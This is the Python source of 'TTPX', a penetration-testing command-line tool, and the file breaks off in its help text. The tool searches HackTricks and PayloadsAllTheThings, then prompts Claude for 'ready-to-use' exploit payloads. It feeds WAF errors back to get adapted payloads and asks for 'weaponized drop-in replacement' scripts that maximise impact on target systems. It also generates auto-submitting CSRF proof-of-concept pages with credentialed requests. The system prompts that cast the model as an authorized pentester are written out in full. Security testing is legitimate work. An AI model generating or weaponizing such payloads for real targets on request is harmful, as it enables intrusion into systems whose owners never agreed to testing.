#!/usr/bin/env python3
# TTPX — Tactics, Techniques, Payloads & Exploits
# Copyright (C) 2026 JonnyRiga
# SPDX-License-Identifier: GPL-3.0-or-later
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
import argparse
import json
import os
import re
import subprocess
import sys
from datetime import date, datetime
from pathlib import Path
from html import escape as html_escape
from urllib.parse import parse_qsl, urlparse

from rich.console import Console
from rich.markup import escape
from rich.table import Table
from rich.syntax import Syntax
from rich import box
from rich.text import Text

console = Console()

HACKTRICKS_PATH = Path.home() / "Tools" / "hacktricks"
PATT_PATH = Path.home() / "Tools" / "payloadsallthethings"
LOG_PATH = Path.home() / "Tools" / "ttpx-session.log"
MAX_PAYLOAD_MATCHES = 10


def source_label(path):
    for base in [HACKTRICKS_PATH, PATT_PATH]:
        if path.is_relative_to(base):
            return f"[{base.name}] {path.relative_to(base)}"
    return str(path)


def _find_match_idx(lines, terms):
    if not terms:
        return None
    for i, line in enumerate(lines):
        if any(term.lower() in line.lower() for term in terms):
            return i
    return None


def _find_heading_idx(lines, start):
    for i in range(start, -1, -1):
        if lines[i].startswith("#"):
            return i
    return 0


def extract_snippet(lines, terms, context=40):
    if not terms:
        return "\n".join(lines[:context])

    headings = [i for i, line in enumerate(lines) if line.startswith("#")]

    if not headings:
        match_idx = _find_match_idx(lines, terms)
        if match_idx is None:
            return "\n".join(lines[:context])
        start = max(0, match_idx - 2)
        return "\n".join(lines[start:start + context])

    best_start = headings[0]
    best_score = -1

    for idx, h_start in enumerate(headings):
        h_end = headings[idx + 1] if idx + 1 < len(headings) else len(lines)
        section_text = "\n".join(lines[h_start:h_end]).lower()
        heading_text = lines[h_start].lower()

        # Terms present anywhere in section
        score = sum(3 for term in terms if term.lower() in section_text)
        # Bonus for terms appearing in the heading itself
        score += sum(2 for term in terms if term.lower() in heading_text)

        if score > best_score:
            best_score = score
            best_start = h_start

    end_idx = min(best_start + context, len(lines))
    return "\n".join(lines[best_start:end_idx])


_TITLE_MAX_LEN = 45


def extract_title(lines, terms, fallback: "Path | None" = None):
    # Prefer a heading line that itself contains a term (most specific match)
    if terms:
        for line in lines:
            if line.startswith("#") and any(term.lower() in line.lower() for term in terms):
                title = line.lstrip("#").strip()
                if len(title) > _TITLE_MAX_LEN:
                    title = title[:_TITLE_MAX_LEN - 3] + "..."
                return title

    # Fall back to nearest heading above first text match
    match_idx = _find_match_idx(lines, terms)
    if match_idx is not None:
        heading_idx = _find_heading_idx(lines, match_idx)
        heading_line = lines[heading_idx]
        if heading_line.startswith("#"):
            title = heading_line.lstrip("#").strip()
            if len(title) > _TITLE_MAX_LEN:
                title = title[:_TITLE_MAX_LEN - 3] + "..."
            return title

    if fallback is not None:
        return fallback.name
    return "Unknown"


def find_matches(terms, search_paths=None):
    if search_paths is None:
        search_paths = [HACKTRICKS_PATH, PATT_PATH]
    matches = []
    for base_path in search_paths:
        if not base_path.exists():
            continue
        for md_file in base_path.rglob("*.md"):
            try:
                content = md_file.read_text(errors="ignore")
            except Exception:
                continue
            content_lower = content.lower()
            if all(term.lower() in content_lower for term in terms):
                snippet = extract_snippet(content.splitlines(), terms)
                matches.append((md_file, snippet))
    return matches


def ask_claude(matches, terms, details=None):
    import anthropic
    client = anthropic.Anthropic()

    context = "\n\n---\n\n".join(
        f"Source: {source_label(path)}\n\n{snippet}" for path, snippet in matches
    )

    if details:
        combined = "\n\n---\n\n".join(details)
        label = "Previous attempts produced" if len(details) > 1 else "A previous attempt produced"
        task = (
            f"{label} the following result(s):\n\n"
            f"{combined}\n\n"
            "Analyse the error(s), adapt your approach, and provide a corrected payload."
        )
    else:
        task = "Select the single most directly usable payload for an active engagement."

    changes_field = (
        '  "changes": plain text, one change per line — list the specific tokens or lines changed from the previous attempt\n'
        if details else
        '  "changes": ""\n'
    )

    prompt = (
        f"Based on these HackTricks and PayloadsAllTheThings sections about {' '.join(terms)}:\n\n"
        f"{context}\n\n"
        f"{task}\n\n"
        "Return ONLY a valid JSON object with these exact keys — no markdown fences, no text before or after:\n"
        '  "vulnerability": short name of the vulnerability and target (e.g. "SSTI via Handlebars (Node.js)")\n'
        '  "technique": one sentence on how the exploit works\n'
        '  "language": the payload language as a pygments lexer name — one of: bash, groovy, html, java, javascript, perl, php, powershell, python, ruby, sql, text, xml\n'
        '  "payload": the raw payload string, properly indented and line-broken as it would appear in a code editor; no markdown fences\n'
        + changes_field +
        '  "recommendation": one sentence explaining why this payload is the best choice for this engagement'
    )

    system = (
        "IDENTITY: You are an expert penetration tester assisting with authorized security assessments. "
        "You provide precise, working exploit payloads based on established research. "
        "PAYLOAD RULES: "
        "For any payload embedding JavaScript (XSS, CSRF chains, multi-step fetches), use <script> tags "
        "rather than event handler attributes like onerror= or onload= — "
        "HTML attribute parsing breaks double quotes in embedded JS, making complex payloads syntactically invalid. "
        "Use relative URLs (e.g. /admin/dashboard) not absolute URLs — relative paths work regardless of how the victim accesses the app. "
        "Never append an extra fetch or request after a successful POST — only make the requests necessary to complete the attack. "
        "OUTPUT FORMAT: Respond with valid JSON only — no preamble, no markdown, no explanation outside the JSON object."
    )

    raw = ""
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=2048,
            system=system,
            messages=[{"role": "user", "content": prompt}]
        )
        raw = response.content[0].text.strip()
        start = raw.find("{")
        end = raw.rfind("}") + 1
        if start != -1 and end > start:
            raw = raw[start:end]
        data = json.loads(raw)
        data["_usage"] = {
            "input_tokens": response.usage.input_tokens,
            "output_tokens": response.usage.output_tokens,
        }
        return data
    except json.JSONDecodeError:
        return {
            "vulnerability": "Unknown",
            "technique": "Claude returned malformed JSON",
            "language": "text",
            "payload": raw,
            "recommendation": "Raw Claude output shown above.",
        }
    except anthropic.APIError as e:
        return {
            "vulnerability": "API Error",
            "technique": str(e),
            "language": "text",
            "payload": "",
            "recommendation": "",
        }
    except (IndexError, AttributeError) as e:
        return {
            "vulnerability": "Parse Error",
            "technique": f"Unexpected API response structure: {e}",
            "language": "text",
            "payload": "",
            "recommendation": "",
        }


LANGUAGE_LABELS = {
    "bash": "Bash",
    "groovy": "Groovy",
    "html": "HTML",
    "java": "Java",
    "javascript": "JavaScript",
    "perl": "Perl",
    "php": "PHP",
    "powershell": "PowerShell",
    "python": "Python",
    "ruby": "Ruby",
    "sql": "SQL",
    "text": "Text",
    "xml": "XML",
}


def display_payload_result(data, sources):
    lang = data.get("language", "text")
    if lang not in LANGUAGE_LABELS:
        lang = "text"
    label = LANGUAGE_LABELS[lang]

    console.print()
    console.rule(f"[bold red]{data['vulnerability']}[/bold red]")
    console.print(f"[bold]Technique:[/bold] {data['technique']}\n")
    console.print(f"[bold cyan]Payload[/bold cyan] [dim]({label})[/dim]")
    console.print(Syntax(data["payload"], lang, theme="monokai", line_numbers=False, padding=(1, 2)))
    console.print("[dim]── copy-paste ──[/dim]")
    console.print(escape(data["payload"]), soft_wrap=True)
    console.print()

    changes = data.get("changes", "")
    if changes:
        console.print("[bold magenta]What changed[/bold magenta]")
        console.print(changes)
        console.print()

    console.print(Text("★ " + data["recommendation"], style="bold yellow"))
    console.print()
    source_str = "  ".join(sources)
    console.print(f"[dim]Source: {escape(source_str)}[/dim]")

    usage = data.get("_usage")
    if usage:
        inp, out = usage["input_tokens"], usage["output_tokens"]
        # cache_read/cache_creation tokens exist on usage if caching is ever enabled — update formula then
        cost = (inp * 3 + out * 15) / 1_000_000
        console.print(f"[dim]Tokens: {inp:,} in / {out:,} out  ·  est. ${cost:.4f}  (Sonnet 4.6)[/dim]")

    console.rule()


def update_sources():
    sources = [
        ("HackTricks", HACKTRICKS_PATH),
        ("PayloadsAllTheThings", PATT_PATH),
    ]
    any_found = False
    for label, path in sources:
        if not path.exists():
            console.print(f"[yellow]{label} not found — skipping.[/yellow]")
            continue
        any_found = True
        console.print(f"[dim]Updating {label}...[/dim]")
        result = subprocess.run(
            ["git", "-C", str(path), "pull", "--ff-only"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            console.print(f"[red]{label} update failed:[/red] {result.stderr.strip()}")
            continue
        output = result.stdout.strip()
        if "up to date" in output.lower() or "up-to-date" in output.lower():
            console.print(f"[green]{label}:[/green] already up to date")
        else:
            stat = subprocess.run(
                ["git", "-C", str(path), "diff", "--stat", "HEAD@{1}", "HEAD"],
                capture_output=True, text=True
            )
            stat_line = stat.stdout.strip().splitlines()[-1] if stat.stdout.strip() else ""
            if stat_line:
                console.print(f"[green]{label}:[/green] updated  [dim]{stat_line}[/dim]")
            else:
                console.print(f"[green]{label}:[/green] updated")
    if not any_found:
        console.print(
            "[red]No sources found. Clone:[/red]\n"
            "  git clone https://github.com/HackTricks-wiki/hacktricks ~/Tools/hacktricks\n"
            "  git clone https://github.com/swisskyrepo/PayloadsAllTheThings ~/Tools/payloadsallthethings"
        )
        sys.exit(1)


def _content_root(base_path: Path) -> Path:
    """Return the directory that contains topic subdirectories.

    HackTricks restructured to a GitBook layout where content lives under src/.
    """
    src = base_path / "src"
    if src.is_dir():
        return src
    return base_path


def _recently_changed_dirs(base_path: Path, days: int) -> set:
    result = subprocess.run(
        ["git", "-C", str(base_path), "log",
         f"--since={days} days ago", "--name-only", "--pretty=format:", "--", "*.md"],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        return set()
    content = _content_root(base_path)
    prefix = content.relative_to(base_path).parts  # e.g. ('src',) or ()
    dirs = set()
    for line in result.stdout.splitlines():
        line = line.strip()
        if line:
            parts = Path(line).parts
            if len(parts) > len(prefix) and parts[:len(prefix)] == prefix:
                dirs.add(parts[len(prefix)])
    return dirs


def list_categories(since_days=None):
    sources = [
        (HACKTRICKS_PATH, "hacktricks"),
        (PATT_PATH, "payloadsallthethings"),
    ]
    any_found = False
    for path, name in sources:
        if not path.exists():
            continue
        any_found = True
        content = _content_root(path)
        all_dirs = sorted(
            d.name for d in content.iterdir()
            if d.is_dir() and not d.name.startswith(".")
        )
        if since_days is not None:
            recent = _recently_changed_dirs(path, since_days)
            dirs = [d for d in all_dirs if d in recent]
            footer = f"[dim]{len(dirs)} of {len(all_dirs)} categories (last {since_days}d)[/dim]"
        else:
            dirs = all_dirs
            footer = f"[dim]{len(dirs)} categories[/dim]"

        table = Table(
            box=box.SIMPLE_HEAD, show_header=True, header_style="bold cyan",
            title=f"\\[{name}]", title_style="bold green"
        )
        table.add_column("Category", style="white")
        table.add_column("Files", style="dim", justify="right")
        for d in dirs:
            file_count = sum(1 for _ in (content / d).rglob("*.md"))
            table.add_row(d, str(file_count))
        console.print(table)
        console.print(footer)
    if not any_found:
        console.print(
            "[red]No sources found. Clone:[/red]\n"
            "  git clone https://github.com/HackTricks-wiki/hacktricks ~/Tools/hacktricks\n"
            "  git clone https://github.com/swisskyrepo/PayloadsAllTheThings ~/Tools/payloadsallthethings"
        )
        sys.exit(1)


def display_find_results(matches, terms):
    if not matches:
        console.print("[yellow]No results found.[/yellow]")
        return

    table = Table(box=box.SIMPLE_HEAD, show_header=True, header_style="bold cyan")
    table.add_column("Source", style="green", no_wrap=True, min_width=14)
    table.add_column("Title", style="white", min_width=30)
    table.add_column("Path", style="dim")

    for path, snippet in matches:
        title = extract_title(path.read_text(errors="ignore").splitlines(), terms, fallback=path)
        for base in [HACKTRICKS_PATH, PATT_PATH]:
            if path.is_relative_to(base):
                src = f"\\[{base.name}]"
                rel = str(path.relative_to(base))
                break
        else:
            src = "\\[unknown]"
            rel = str(path)
        table.add_row(src, title, rel)

    console.print(table)
    console.print(f"[dim]{len(matches)} result(s)[/dim]")


def strip_markdown(text):
    # code fences — keep content, drop fence lines
    text = re.sub(r"```[^\n]*\n", "", text)
    text = re.sub(r"```", "", text)
    # images — must run before links to avoid leaving a bare '!' artifact
    text = re.sub(r"!\[[^\]]*\]\([^\)]+\)", "", text)
    # links — keep display text
    text = re.sub(r"\[([^\]]+)\]\([^\)]+\)", r"\1", text)
    # headings — keep text, drop # symbols
    text = re.sub(r"^#{1,6}\s+", "", text, flags=re.MULTILINE)
    # bold/italic with asterisks only — skip underscore variants to preserve
    # __dunder__ names in Python payloads and shell glob patterns like *.php
    text = re.sub(r"(?<!\*)\*\*\*(?!\s)(.+?)(?<!\s)\*\*\*(?!\*)", r"\1", text)
    text = re.sub(r"(?<!\*)\*\*(?!\s)(.+?)(?<!\s)\*\*(?!\*)", r"\1", text)
    text = re.sub(r"(?<!\*)\*(?!\s)([^\*\n]+?)(?<!\s)\*(?!\*)", r"\1", text)
    # strikethrough
    text = re.sub(r"~~(.+?)~~", r"\1", text)
    # inline code — keep content
    text = re.sub(r"`(.+?)`", r"\1", text)
    # blockquotes
    text = re.sub(r"^>\s?", "", text, flags=re.MULTILINE)
    # horizontal rules
    text = re.sub(r"^[-*_]{3,}\s*$", "", text, flags=re.MULTILINE)
    # collapse 3+ blank lines to 2
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text.strip()


def extract_section(text, section_term):
    lines = text.splitlines()
    start = None
    heading_level = None

    for i, line in enumerate(lines):
        if line.startswith("#") and section_term.lower() in line.lower():
            start = i
            heading_level = len(line) - len(line.lstrip("#"))
            break

    if start is None:
        return None

    end = len(lines)
    for i in range(start + 1, len(lines)):
        if lines[i].startswith("#"):
            level = len(lines[i]) - len(lines[i].lstrip("#"))
            if level <= heading_level:
                end = i
                break

    return "\n".join(lines[start:end]).strip()


def mirror_file(rel_path, section=None):
    target = None
    for base in [HACKTRICKS_PATH, PATT_PATH]:
        candidate = base / rel_path
        try:
            candidate.resolve().relative_to(base.resolve())
        except ValueError:
            continue
        if candidate.exists():
            target = candidate
            break

    if target is None:
        console.print(f"[red]File not found in any source:[/red] {rel_path}")
        console.print("  Check the path matches a -f result exactly.")
        sys.exit(1)

    content = target.read_text(errors="ignore")

    for base in [HACKTRICKS_PATH, PATT_PATH]:
        if target.is_relative_to(base):
            source_header = f"# Source: [{base.name}] {target.relative_to(base)}  (mirrored: {date.today()})\n\n"
            break
    else:
        source_header = f"# Source: {target}  (mirrored: {date.today()})\n\n"

    if section:
        raw_section = extract_section(content, section)
        if raw_section is None:
            console.print(f"[yellow]Section '{section}' not found — mirroring full file.[/yellow]")
            plain = strip_markdown(content)
        else:
            plain = strip_markdown(raw_section)
    else:
        plain = strip_markdown(content)

    out = Path.cwd() / (target.stem + ".txt")
    out.write_text(source_header + plain)
    console.print(f"[green]Mirrored:[/green] {out.name}  [dim]({len(plain.splitlines())} lines)[/dim]")


def parse_raw_request(file_path):
    try:
        content = Path(file_path).read_text(errors="ignore")
    except FileNotFoundError:
        console.print(f"[red]Request file not found:[/red] {file_path}")
        sys.exit(1)

    lines = content.splitlines()
    if not lines:
        console.print("[red]Request file is empty.[/red]")
        sys.exit(1)

    parts = lines[0].strip().split()
    if len(parts) < 2:
        console.print(f"[red]Invalid request line:[/red] {lines[0].strip()}")
        sys.exit(1)

    method = parts[0].upper()
    path = parts[1]

    headers = {}
    body_start = len(lines)
    for i, line in enumerate(lines[1:], start=1):
        if not line.strip():
            body_start = i + 1
            break
        if ":" in line:
            key, _, value = line.partition(":")
            headers[key.strip()] = value.strip()

    body = "\n".join(lines[body_start:]).strip() if body_start < len(lines) else ""

    host = headers.get("Host", headers.get("host", ""))
    bare_host = host.split("@")[-1]  # strip userinfo if present
    if ":" in bare_host:
        scheme = "https" if bare_host.rsplit(":", 1)[-1] == "443" else "http"
    else:
        scheme = "http"  # no explicit port — default http; use Host: host:443 for HTTPS
    url = f"{scheme}://{host}{path}" if host else path

    content_type = headers.get("Content-Type", headers.get("content-type", ""))

    return {
        "method": method,
        "path": path,
        "url": url,
        "host": host,
        "headers": headers,
        "body": body,
        "content_type": content_type,
    }


_CSRF_TOKEN_FIELDS = {
    "csrf_token", "csrftoken", "_csrf", "_csrf_token", "csrf",
    "authenticity_token", "__requestverificationtoken", "requestverificationtoken",
    "_token", "xsrf_token", "csrfmiddlewaretoken", "ant-csrf-token",
    "_wpnonce",
    # "token" and "nonce" intentionally omitted — too generic, high false-positive
    # rate with OAuth flows, payment APIs, and invitation links.
}

_CSRF_TOKEN_HEADERS = {
    "x-csrf-token", "x-xsrf-token", "x-csrftoken", "x-request-token",
    "x-ant-csrf-token",
    # "x-requested-with" intentionally omitted — it is a same-origin hint, not a
    # secret token; flagging it as a CSRF token would be misleading.
}


def detect_csrf_tokens(parsed):
    """Return list of (location, name) tuples for any detected CSRF token fields/headers.

    Known limitations:
    - Only top-level JSON keys are checked; nested tokens (e.g. data.csrf_token) are not detected.
    - multipart/form-data body fields are not parsed.
    - Cookie-based CSRF tokens (e.g. XSRF-TOKEN cookie) are out of scope.
    """
    found = []
    ct = parsed["content_type"].lower()
    body = parsed["body"]

    # Form-encoded body — also attempt heuristic parse when Content-Type is absent
    if "application/x-www-form-urlencoded" in ct or (body and "=" in body):
        for name, _ in parse_qsl(body, keep_blank_values=True):
            if name.lower() in _CSRF_TOKEN_FIELDS:
                found.append(("body field", name))

    # JSON body — top-level keys only
    if "application/json" in ct and body:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                for key in obj:
                    if key.lower() in _CSRF_TOKEN_FIELDS:
                        found.append(("JSON field", key))
        except (json.JSONDecodeError, ValueError):
            pass

    # Request headers
    for header in parsed["headers"]:
        if header.lower() in _CSRF_TOKEN_HEADERS:
            found.append(("header", header))

    return found


def _js_escape(s):
    """Escape a string for safe embedding inside a JS single-quoted string literal."""
    return (
        s.replace("\\", "\\\\")
         .replace("'", "\\'")
         .replace("/", "\\/")   # prevent </script> breakout in inline script blocks
         .replace("\n", "\\n")
         .replace("\r", "\\r")
    )


_HTML_OPEN = (
    "<!DOCTYPE html>\n"
    '<html lang="en">\n'
    "<head>\n"
    '  <meta charset="UTF-8">\n'
    '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
    "  <title>CSRF PoC</title>\n"
    "</head>\n"
    "<body>\n"
)
_HTML_CLOSE = "</body>\n</html>\n"


def generate_csrf_poc(parsed):
    method = parsed["method"]
    url = parsed["url"]
    ct = parsed["content_type"].lower()
    body = parsed["body"]

    safe_url_attr = html_escape(url, quote=True)   # for HTML attributes
    safe_url_js = _js_escape(url)                  # for JS string literals
    safe_method_js = _js_escape(method)

    if method == "GET":
        from urllib.parse import urlparse, parse_qs
        parsed_url = urlparse(url)
        base_url = html_escape(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}", quote=True)
        params = parse_qs(parsed_url.query, keep_blank_values=True)
        hidden_inputs = "".join(
            f'    <input type="hidden" name="{html_escape(k, quote=True)}" value="{html_escape(v[0], quote=True)}">\n'
            for k, v in params.items()
        )
        inner = (
            f'  <form id="csrf" method="GET" action="{base_url}">\n'
            f"{hidden_inputs}"
            "  </form>\n"
            "  <script>document.getElementById('csrf').submit();</script>\n"
        )
        return _HTML_OPEN + inner + _HTML_CLOSE, "get"

    if "application/json" in ct:
        try:
            # replace "</" with "<\/" so </script> can't break out of the script block
            body_repr = json.dumps(json.loads(body)).replace("</", "<\\/")
        except (json.JSONDecodeError, ValueError):
            body_repr = f"'{_js_escape(body)}'"
        inner = (
            "  <script>\n"
            f"    fetch('{safe_url_js}', {{\n"
            f"      method: '{safe_method_js}',\n"
            "      credentials: 'include',\n"
            "      headers: {'Content-Type': 'application/json'},\n"
            f"      body: JSON.stringify({body_repr})\n"
            "    });\n"
            "  </script>\n"
            "  <!-- Note: Content-Type: application/json triggers CORS preflight.\n"
            "       Only works if the server has a CORS misconfiguration.\n"
            "       Try switching Content-Type to text/plain if blocked. -->\n"
        )
        return _HTML_OPEN + inner + _HTML_CLOSE, "json"

    if "multipart/form-data" in ct:
        inner = (
            "  <script>\n"
            "    var form = new FormData();\n"
            "    /* Add fields from the captured request body below */\n"
            "    /* form.append('field', 'value'); */\n"
            f"    fetch('{safe_url_js}', {{\n"
            f"      method: '{safe_method_js}',\n"
            "      credentials: 'include',\n"
            "      body: form\n"
            "    });\n"
            "  </script>\n"
        )
        return _HTML_OPEN + inner + _HTML_CLOSE, "multipart"

    # Default: application/x-www-form-urlencoded or unknown — HTML form
    fields = parse_qsl(body, keep_blank_values=True) if body else []
    inputs = "\n".join(
        f'    <input type="hidden" name="{html_escape(name, quote=True)}" value="{html_escape(value, quote=True)}" />'
        for name, value in fields
    )
    # trailing "  " aligns the closing </form> tag after the last <input> line
    inputs_block = f"\n{inputs}\n  " if inputs else ""
    inner = (
        f'  <form action="{safe_url_attr}" method="{html_escape(method, quote=True)}" id="csrf-form">'
        f"{inputs_block}</form>\n"
        "  <script>document.getElementById('csrf-form').submit();</script>\n"
    )
    return _HTML_OPEN + inner + _HTML_CLOSE, "form"


def ask_claude_csrf_bypass(parsed, tokens):
    """Call Claude for CSRF bypass strategies.

    tokens — output of detect_csrf_tokens(parsed), already computed offline.
    Claude skips re-detection and focuses purely on bypass strategy.
    """
    import anthropic
    client = anthropic.Anthropic()

    method = parsed["method"]
    ct = parsed["content_type"] or "(none)"
    body_preview = parsed["body"][:300] if parsed["body"] else "(none)"

    # Build known-facts block from offline detection so Claude doesn't re-derive them
    if tokens:
        token_lines = "\n".join(f"  - {loc}: {name}" for loc, name in tokens)
        token_context = f"CSRF tokens already detected offline:\n{token_lines}"
        focus = (
            "The offline analysis has already confirmed CSRF token(s) are present. "
            "Focus your bypass suggestions on: stripping or predicting the token, "
            "leaking it via CORS/XSS, Content-Type manipulation to avoid preflight, "
            "and method override tricks. Do NOT re-confirm token presence."
        )
    else:
        token_context = (
            "No CSRF token fields or headers detected in this request. "
            "Note: cookie-based CSRF tokens (e.g. XSRF-TOKEN double-submit) were not checked — "
            "they may still be present."
        )
        focus = (
            "No token was detected offline. Focus on: whether the server enforces "
            "SameSite cookies, Origin/Referer header validation, Content-Type "
            "restrictions, and whether the offline PoC is already sufficient. "
            "If no meaningful defence is apparent, say so clearly."
        )

    prompt = (
        f"You are reviewing a captured HTTP request for CSRF exploitability.\n\n"
        f"Method: {method}\n"
        f"URL: {parsed['url']}\n"
        f"Content-Type: {ct}\n"
        f"Body (first 300 chars): {body_preview}\n\n"
        f"{token_context}\n\n"
        f"{focus}\n\n"
        "Return ONLY a valid JSON object with these exact keys — no markdown fences, no text before or after:\n"
        '  "content_type_attack": one sentence on a Content-Type manipulation bypass if applicable, else ""\n'
        '  "method_override_applicable": true/false\n'
        '  "bypass_variants": array of up to 4 objects, each with "technique" (short name) and '
        '"poc_note" (one sentence on how to adapt the PoC)\n'
        '  "recommendation": one sentence on the single most promising bypass for this specific request'
    )

    system = (
        "IDENTITY: You are an expert penetration tester assisting with authorized security assessments. "
        "You receive pre-analysed request facts and suggest concrete, targeted CSRF bypass techniques. "
        "Do not repeat analysis already provided — go straight to actionable bypass strategies. "
        "OUTPUT FORMAT: Respond with valid JSON only — no preamble, no markdown, no explanation outside the JSON object."
    )

    raw = ""
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            system=system,
            messages=[{"role": "user", "content": prompt}]
        )
        raw = response.content[0].text.strip()
        start = raw.find("{")
        end = raw.rfind("}") + 1
        if start != -1 and end > start:
            raw = raw[start:end]
        data = json.loads(raw)
        data["_usage"] = {
            "input_tokens": response.usage.input_tokens,
            "output_tokens": response.usage.output_tokens,
        }
        return data
    except json.JSONDecodeError:
        return {"bypass_variants": [], "recommendation": raw, "_raw": True}
    except (anthropic.APIError, IndexError, AttributeError) as e:
        return {"bypass_variants": [], "recommendation": str(e), "_error": True}


def display_csrf_poc(html, parsed, poc_type, tokens=None, bypass_data=None):
    out_path = Path.cwd() / "csrf_poc.html"
    out_path.write_text(html)

    type_labels = {
        "form": "HTML form (auto-submit)",
        "json": "fetch() — JSON body",
        "get": "form GET / auto-submit",
        "multipart": "fetch() — FormData (fill fields manually)",
    }

    console.print()
    console.rule("[bold red]CSRF PoC[/bold red]")
    console.print(f"[bold]Target:[/bold]  {parsed['method']} {parsed['url']}")
    console.print(f"[bold]Type:[/bold]    {type_labels.get(poc_type, poc_type)}\n")
    console.print("[bold cyan]PoC[/bold cyan] [dim](HTML)[/dim]")
    console.print(Syntax(html, "html", theme="monokai", line_numbers=False, padding=(1, 2)))
    console.print("[dim]── copy-paste ──[/dim]")
    console.print(escape(html), soft_wrap=True)
    console.print()
    console.print(f"[green]Saved:[/green] {out_path}")

    if tokens:
        console.print()
        for location, name in tokens:
            console.print(f"[yellow]⚠ CSRF token detected ({location}):[/yellow] [bold]{name}[/bold]")
        console.print("[dim]  PoC will likely fail — token must be leaked or static to exploit.[/dim]")
        if not bypass_data:
            console.print("[dim]  Use --bypass for Claude's analysis of bypass options.[/dim]")

    if bypass_data:
        console.print()
        console.rule("[bold magenta]Bypass Analysis[/bold magenta]")

        ct_attack = bypass_data.get("content_type_attack", "")
        if ct_attack:
            console.print(f"[bold]Content-Type attack:[/bold] {ct_attack}")

        variants = bypass_data.get("bypass_variants", [])
        if variants:
            console.print("\n[bold]Bypass variants:[/bold]")
            for v in variants:
                console.print(f"  [cyan]{v.get('technique', '')}[/cyan] — {v.get('poc_note', '')}")

        rec = bypass_data.get("recommendation", "")
        if rec and not bypass_data.get("_raw") and not bypass_data.get("_error"):
            console.print()
            console.print(Text("★ " + rec, style="bold yellow"))

        usage = bypass_data.get("_usage")
        if usage:
            inp, out = usage["input_tokens"], usage["output_tokens"]
            cost = (inp * 3 + out * 15) / 1_000_000
            console.print(f"\n[dim]Tokens: {inp:,} in / {out:,} out  ·  est. ${cost:.4f}  (Sonnet 4.6)[/dim]")

    console.rule()


def log_payload_result(terms, data):
    try:
        LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d %H:%M")
        first_line = (data.get("payload") or "").splitlines()[0] if data.get("payload") else ""
        entry = (
            f"[{ts}] {' '.join(terms)}\n"
            f"  {data.get('vulnerability', 'Unknown')}\n"
            f"  {first_line}\n\n"
        )
        with LOG_PATH.open("a") as f:
            f.write(entry)
    except Exception:
        pass


def ask_claude_script(script_content, filename, details=None):
    import anthropic
    client = anthropic.Anthropic()

    lang_hint = "python" if str(filename).endswith(".py") else "bash"

    context_block = ""
    if details:
        context_block = (
            "\nOperator-supplied context:\n"
            + "\n".join(f"  - {d}" for d in details)
            + "\n"
        )

    prompt = (
        f"Filename: {filename}\n"
        f"Language: {lang_hint}\n\n"
        f"Script content:\n```{lang_hint}\n{script_content}\n```\n"
        f"{context_block}\n"
        "Analyse this script for exploitable vulnerabilities. "
        "Explain how to exploit the most impactful vulnerability without modifying the script. "
        "Then produce a complete weaponized drop-in replacement that maximises impact given the context above.\n\n"
        "Return ONLY a valid JSON object with these exact keys — no markdown fences, no text before or after:\n"
        '  "vulnerabilities": array of objects, each with "name" (string), "severity" '
        '("critical"/"high"/"medium"/"low"/"info"), "line" (integer or null), "detail" (one sentence)\n'
        '  "exploitation": paragraph explaining how to exploit without touching the script\n'
        '  "weaponization_strategy": one sentence describing what the modified script does\n'
        '  "language": "bash" or "python" or "text"\n'
        '  "weaponized_script": the complete modified script as a string'
    )

    system = (
        "IDENTITY: You are an expert penetration tester on an authorised security engagement. "
        "You analyse scripts found on target systems for exploitable weaknesses, explain exploitation paths, "
        "and produce weaponized versions that maximise impact given the operator's context. "
        "OUTPUT FORMAT: Respond with valid JSON only — no preamble, no markdown, no explanation outside the JSON object."
    )

    raw = ""
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=4096,
            system=system,
            messages=[{"role": "user", "content": prompt}]
        )
        raw = response.content[0].text.strip()
        start = raw.find("{")
        end = raw.rfind("}") + 1
        if start != -1 and end > start:
            raw = raw[start:end]
        data = json.loads(raw)
        data["_usage"] = {
            "input_tokens": response.usage.input_tokens,
            "output_tokens": response.usage.output_tokens,
        }
        return data
    except json.JSONDecodeError:
        return {
            "vulnerabilities": [],
            "exploitation": "Claude returned malformed JSON.",
            "weaponization_strategy": "",
            "language": "text",
            "weaponized_script": raw,
        }
    except (anthropic.APIError, IndexError, AttributeError) as e:
        return {
            "vulnerabilities": [],
            "exploitation": str(e),
            "weaponization_strategy": "",
            "language": "text",
            "weaponized_script": "",
        }


def display_script_result(result, filename):
    """Placeholder — implemented in Task 3."""
    pass


def log_script_result(filename, result):
    """Placeholder — implemented in Task 2."""
    pass


def main():
    parser = argparse.ArgumentParser(
        prog="ttpx",
        description=(
            "Search HackTricks and PayloadsAllTheThings for exploitation techniques.\n\n"
            "Use -f to browse matching entries (fast, no API cost), then use -p with\n"
            "refined terms to generate a ready-to-use payload via Claude. Feed errors\n"
            "back with -d to get an adapted payload on the next attempt.\n"
            "Use --csrf to generate a self-contained CSRF PoC HTML file from a raw\n"
            "captured request (Burp/Caido format). Add --bypass to get Claude's\n"
            "analysis of token bypass and Content-Type attack variants."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  ttpx -l                                         # browse all categories\n"
            "  ttpx -l --since 7d                              # categories updated in last 7 days\n"
            "  ttpx -u                                         # update knowledge bases\n"
            "  ttpx -f ssti handlebars\n"
            "  ttpx -f lfi php windows\n"
            "  ttpx -p ssti handlebars groovy rce\n"
            "  ttpx -p sqli union mysql -d \"WAF blocking SELECT keyword\"\n"
            "  ttpx -p lfi php -d \"../etc/passwd filtered, got 403\"\n"
            "  ttpx -m \"Server Side Template Injection/JavaScript.md\"\n"
            "  ttpx -m \"Server Side Template Injection/JavaScript.md\" -s handlebars\n"
